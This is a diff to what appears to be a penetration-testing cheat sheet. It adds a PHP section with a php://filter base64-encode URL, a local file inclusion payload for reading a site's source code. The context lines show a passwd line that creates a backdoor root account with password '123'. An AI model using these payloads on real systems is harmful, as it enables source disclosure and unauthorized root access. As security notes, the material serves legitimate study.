@@ -12,6 +12,13 @@ salt:new passwd:123
 new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 ```
 
+## php
+```
+filter
+http://xxx/index.php?m=php://filter/convert.base64-encode/resource=index
+
+```
+
 ## subdomain
 ```
 https://dnsdumpster.com/
